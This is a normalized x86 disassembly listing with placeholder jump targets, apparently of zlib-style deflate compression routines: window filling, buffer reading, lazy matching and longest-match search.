mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_403ba0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x54 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x54 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405fb2
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_403ba0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0xc ] 0x4
sete cl
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405fb2
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_403ba0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
sub_4042f0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx - 0x106 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jb r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x68 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x68 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x54 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x64 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + 0x6c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_40452b
add esp 0xc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x3
jb r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x106
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
mov dx [ ebp - 0x18 ]
mov [ ecx ] dx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x34 ]
sub ecx [ eax + 0x6c ]
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x64 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x2
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0x1c ]
mov [ edx ] ax
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub_40452b
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_4055a0
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov esp ebp
pop ebp
retn
sub_4045c3
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042f0
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x3
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
cmp eax edx
ja r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov dl [ edx + ecx ]
mov [ ebp - 0x14 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x14 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x6c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x3
mov [ ebp - 0x10 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0xc ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x10 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0xc ]
sub dx 0x1
mov [ ebp - 0xc ] dx
mov eax [ ebp - 0x10 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x10 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0xc ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_404b1a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x58 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
sub eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x6c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x58 ]
cmp ecx [ eax + 0x78 ]
ja r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_405fb2
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_403ba0
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405fb2
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_403ba0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
jmp r-xdata
jmp r-xdata
sub_404b1a
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jbe r-xdata
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax ecx
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x6c ]
jbe r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x2
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
lea ecx [ ecx + eax + 0x102 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x84 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx - 0x1 ]
mov eax [ ebp - 0x8 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0xc ]
and eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x20 ]
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
cmp edx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx + 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1 ]
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x14 ]
mov ecx 0x102
sub ecx eax
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x102
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x68 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0xc ]
jl r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
